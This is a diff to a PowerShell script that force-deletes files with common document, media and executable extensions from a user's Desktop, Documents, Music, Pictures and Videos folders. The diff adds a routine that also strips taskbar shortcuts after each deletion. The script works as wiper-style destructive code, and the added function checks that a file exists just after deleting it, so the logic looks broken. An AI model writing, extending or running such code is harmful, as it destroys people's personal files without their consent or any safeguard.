@@ -8,6 +8,28 @@ $extensionsToDelete = @("exe", "json", "doc", "pdf", "wpd", "docx", "rtf", "tex"
 
 $pathsToDelete = @($desktopPath, $documentsPath, $musicPath, $picturesPath, $videosPath)
 
+# Function to remove app from the taskbar
+function Remove-AppFromTaskbar {
+    param (
+        [Parameter(Mandatory=$true)]
+        [ValidateScript({Test-Path $_ -PathType Leaf})]
+        [string]$FilePath
+    )
+
+    # Get the application's file name without the extension
+    $appName = [System.IO.Path]::GetFileNameWithoutExtension($FilePath)
+
+    # Get the Start Menu shortcut path for the application
+    $shortcutPath = Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\$appName.lnk"
+
+    # Remove the application's shortcut from the taskbar
+    if (Test-Path -Path $shortcutPath) {
+        Write-Host "Removing app from taskbar: $shortcutPath"
+        Remove-Item -Path $shortcutPath -Force
+    }
+}
+
+# Remove existing apps from the taskbar
 foreach ($path in $pathsToDelete) {
     foreach ($extension in $extensionsToDelete) {
         $filesToDelete = Get-ChildItem -Path $path -Filter "*.$extension" -File
@@ -16,6 +38,9 @@ foreach ($path in $pathsToDelete) {
             $filePath = $file.FullName
             Write-Host "Deleting file: $filePath"
             Remove-Item -Path $filePath -Force
+
+            # Remove the app from the taskbar
+            Remove-AppFromTaskbar -FilePath $filePath
         }
     }
 
@@ -27,23 +52,4 @@ foreach ($path in $pathsToDelete) {
     }
 }
 
-# Disable apps in the taskbar
-$taskbarPath = [Environment]::GetFolderPath("ApplicationData") + "\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"
-$taskbarItems = Get-ChildItem -Path $taskbarPath -File
-
-foreach ($item in $taskbarItems) {
-    $item.FullName | ForEach-Object {
-        $itemPath = $_
-        Write-Host "Disabling app: $itemPath"
-        $shell = New-Object -ComObject "Shell.Application"
-        $folder = $shell.Namespace((Split-Path $itemPath))
-        $file = $folder.ParseName((Split-Path $itemPath -Leaf))
-        $verb = $file.Verbs() | Where-Object {$_.Name -eq "Pin to Taskbar"}
-        if ($verb) {
-            $verb.DoIt()
-        }
-    }
-}
-
 Write-Host "File deletion and copy creation complete."
-Write-Host "Apps in the taskbar have been disabled."
